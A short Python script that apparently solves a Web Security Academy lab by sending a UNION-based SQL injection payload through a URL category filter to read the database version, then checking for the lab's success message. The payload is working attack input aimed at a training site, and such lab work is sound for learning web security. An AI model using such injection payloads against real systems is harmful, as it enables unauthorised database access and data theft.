# Retrieving data from other database tables
# Examining DB- querying the database type and version on MySQL and Microsoft

import requests

# 2 columns - strings
url = "https://ac3e1f6a1ebfd03280cd0d2f0007001a.web-security-academy.net/filter?category=Pets"
payload = "' UNION SELECT NULL, @@version -- "

try:
    r_solve = requests.get(url+payload)
    if "Congratulations, you solved the lab!" in r_solve.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)